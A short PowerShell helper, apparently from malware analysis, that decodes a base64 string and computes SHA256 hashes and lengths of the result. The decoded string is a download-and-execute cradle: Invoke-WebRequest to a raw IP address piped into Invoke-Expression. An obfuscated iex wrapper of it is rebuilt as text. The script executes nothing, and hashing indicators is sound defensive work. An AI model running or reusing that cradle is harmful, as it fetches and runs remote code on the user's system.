# Computes SHA256 of the exact strings. Decode only - nothing is executed.
$b64 = 'SW52b2tlLVdlYlJlcXVlc3QgJ2h0dHA6Ly8xNjYuMS44OS45MS96YXAvJyAtVXNlQmFzaWNQYXJzaW5nIHwgSW52b2tlLUV4cHJlc3Npb24='
$dec = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($b64))
$line = "iex([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('$b64')))"

function Get-Sha256($s) {
  $sha = [Security.Cryptography.SHA256]::Create()
  ($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($s)) | ForEach-Object { $_.ToString('x2') }) -join ''
}

"DECODED        : $dec"
""
"SHA256 base64  : " + (Get-Sha256 $b64)
"SHA256 decoded : " + (Get-Sha256 $dec)
"SHA256 fullcmd : " + (Get-Sha256 $line)
"SHA256 decoded+LF : " + (Get-Sha256 ($dec + "`n"))
"SHA256 decoded+CRLF: " + (Get-Sha256 ($dec + "`r`n"))
""
"Length base64  : " + $b64.Length
"Length decoded : " + $dec.Length

